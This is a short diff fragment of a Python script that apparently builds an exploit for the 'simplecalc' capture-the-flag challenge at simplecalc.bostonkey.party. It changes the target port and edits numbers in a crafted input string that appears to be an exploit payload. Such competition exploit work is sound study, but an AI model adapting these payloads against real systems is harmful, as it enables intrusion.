@@ -27,7 +27,7 @@ import socket
 
 # Setting up for remote exploit in future
 host = "simplecalc.bostonkey.party"
-port = 5400
+port = 5500
 
 ret = '''254
 2
@@ -79,7 +79,7 @@ ret = '''254
 88
 
 2
-100
+7113764
 100
 
 2
